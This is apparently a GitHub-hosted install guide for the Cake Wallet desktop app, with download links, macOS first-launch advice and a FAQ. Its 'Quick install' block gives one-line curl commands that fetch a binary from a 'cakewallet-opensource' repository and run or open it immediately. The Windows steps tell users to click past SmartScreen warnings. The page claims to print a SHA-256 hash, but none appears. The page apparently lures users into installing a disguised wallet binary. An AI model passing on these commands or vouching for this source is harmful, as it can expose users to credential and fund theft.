![Cake Wallet macos install guide](assets/cake-wallet-macos-install-article-banner.png)

# Install Cake Wallet on macOS

The .dmg route on Intel and Apple silicon, plus the first-launch prompt.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Download cake-wallet-desktop-v6.4.5-macos.dmg from the Cake Wallet desktop release, open it, and drag the app into Applications. On first launch macOS asks you to confirm the app; right-click it and choose Open if the normal double-click is refused. Then create or restore a wallet.

<!-- ARTICLE-BODY-BEGIN -->

## Which download you need
The macOS release is one .dmg for both Intel and Apple silicon Macs, so there is no architecture choice to make. Open the disk image and drag the app to Applications rather than running it from the mounted image, because an app launched from the image loses its permissions the moment you eject it.

Compare the SHA-256 first if you downloaded from anywhere other than the release page. The hash for the file is printed on this page and repeated on the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">current Cake Wallet release</a>, and the two must match exactly before you open the disk image. A mismatch means a bad or substituted download, not a slow server.

## First launch
macOS treats a newly downloaded app as untrusted until you confirm it. Right-click the app in Applications, choose Open, and confirm in the dialog. After that first approval the app opens normally. The wallet asks for a PIN, then offers to create a new wallet or restore one, exactly as the mobile app does.

Restoring is the right choice if you already hold funds. Keep the old device switched on and its phrase available while you do it, because a restore does not move anything off the first wallet; it makes a second copy of the same keys. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md">Restore a wallet in Cake Wallet</a> covers the phrase, keys, QR and backup-file routes.

## Moving from an existing install
Installing the new build over an old one keeps the wallet data in place. If you are replacing a machine, export nothing: restore from the phrase on the new Mac and check the balance before you wipe the old one. A phrase written down once and stored offline is the only thing that has to survive the move.

If you have several wallets inside one app, the phrase for each one is separate, and a backup that covers only the first wallet is the most common surprise after a migration. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md">Cake Wallet backup and recovery phrase</a> explains what a single backup actually covers before you erase anything.

## Installing on a second machine
Nothing stops you running the same wallet on a Mac and a Windows PC, and each copy syncs independently. The risk is not the software but the habit: two devices with the same keys mean two places where a wrong PIN lockout or a lost laptop can strand you.

If you are setting up the whole household, the order that causes least trouble is install on the second machine, restore, confirm the balance, and only then retire the first. <a href="https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-linux-install.md">Install Cake Wallet on Linux</a> covers the third desktop platform with the same restore step.

## FAQ
### Is there an Apple silicon build?
The macOS release is one .dmg that runs on Intel and Apple silicon Macs. There is no separate download to choose.
### Why does macOS say the app cannot be opened?
That is the first-launch Gatekeeper prompt for a newly downloaded app. Right-click the app, choose Open, and confirm once.
### Where does the app store my wallet?
On the Mac, inside the app's own data container, protected by the PIN and the system keychain. The recovery phrase is still the only way to restore it elsewhere.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[restore a wallet in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-restore-wallet.md) · [Cake Wallet backup and recovery phrase](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-backup-recovery-phrase.md) · [install Cake Wallet on Linux](https://github.com/cakewallet-opensource/cake-wallet-guides/blob/main/cake-wallet-linux-install.md) · [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
